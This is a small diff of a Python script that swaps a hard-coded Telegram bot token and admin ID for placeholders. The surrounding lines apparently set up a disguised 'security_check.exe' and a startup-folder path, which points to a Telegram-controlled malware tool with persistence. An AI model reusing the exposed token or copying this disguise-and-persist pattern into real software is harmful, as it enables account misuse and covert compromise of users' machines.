@@ -22,8 +22,8 @@ import subprocess
 
 MY_TIME = datetime.now().strftime('%H.%M.%S_%Y.%m.%d')
 # telegram token and id
-TOKEN = r'5026728362:AAGzmYf3Qt8vF9rOn4LNaEgPc3JXTtT5dJk'
-ADMIN_ID = r'1820665678'
+TOKEN = r'some_token'
+ADMIN_ID = r'some_id'
 USER_NAME = gp.getuser()
 DOWNLOADS_PATH = f'C:/Users/{USER_NAME}/Downloads/security_check.exe'
 STARTUP_PATH = f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/' \
